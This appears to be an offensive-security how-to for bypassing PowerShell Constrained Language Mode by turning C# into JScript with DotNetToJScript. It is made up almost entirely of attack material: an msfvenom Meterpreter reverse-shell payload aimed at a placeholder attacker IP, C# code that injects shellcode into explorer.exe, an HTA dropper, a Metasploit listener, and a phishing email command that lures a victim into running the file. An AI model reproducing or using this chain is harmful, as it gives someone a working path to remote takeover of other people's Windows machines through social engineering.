# C# for CLM Bypass with DotNetToJScript

### 1) Download project

    git clone https://github.com/tyranid/DotNetToJScript

### 2) Create payload

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp

### 3) Open TestClass.cs and insert this code

    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;
    //using System.Threading.Tasks;
    
    [ComVisible(true)]
    public class TestClass
    {
    
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public TestClass()
        {
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            byte[] buf = new byte[874] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
    0xcc,0x00,0x00,...,0x48,0x31,0xd2,
    0x89,0xda,0xff,0xd5};
    
            IntPtr outSize;
    
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    
        public void RunProcess(string path)
        {
            Process.Start(path);
        }
    }

### 4) Compile the project for Release

    dotnet build

### 5) Convert the .exe to .js

    .\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe .\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll --lang=Jscript --ver=v4 -o payload.js

### 6) Create drop.hta and insert all the code from payload.js

    <html>
    <head>
    <script language="JScript">
    // PASTE WHOLE JS FILE HERE
    </script>
    </head>
    <body>
    
    <script language="JScript">
    self.close();
    </script>
    
    </body>
    </html>

### 7) Start listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"

### 8) Start HTTP Server

    python3 -m http.server 80

### 9) Find a way to deliver the .hta file to the user and that he executes it, then you should get your reverse shell; remember that this hta file should be like a link or a shortcut and to works needs to be executed with C:\Windows\System32\mshta.exe, below is just an example for email

    sendEmail -s [SNMP_SERVER] -t [VICTIM_EMAIL_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -m "Please click here http://[ATTACKER_IP]/drop.hta" -a drop.hta
